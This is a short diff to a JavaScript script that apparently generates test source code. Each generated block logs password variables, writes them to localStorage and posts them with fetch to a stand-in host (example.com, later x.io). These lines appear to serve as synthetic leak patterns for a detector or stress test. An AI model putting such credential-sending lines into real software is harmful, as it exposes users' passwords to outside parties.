@@ -16,16 +16,16 @@ const lines = [
 ];
 
 for (let source = 0; source < sourceCount; source += 1) {
-  lines.push(`const accountPassword${source} = \"synthetic-secret-${source}\";`);
+  lines.push(`const password${source}=0;`);
 }
 
 for (let source = 0; source < sourceCount; source += 1) {
   for (let repeat = 0; repeat < repeatsPerSource; repeat += 1) {
-    const value = `accountPassword${source}`;
+    const value = `password${source}`;
     lines.push(`console.log(${value});`);
     lines.push(`logger.info(${value});`);
-    lines.push(`fetch(\"https://example.com/collect/${repeat}\", { method: \"POST\", body: ${value} });`);
-    lines.push(`localStorage.setItem(\"password-${repeat}\", ${value});`);
+    lines.push(`fetch(\"https://x.io\",{body:${value}});`);
+    lines.push(`localStorage.setItem(\"p\",${value});`);
   }
 }
 
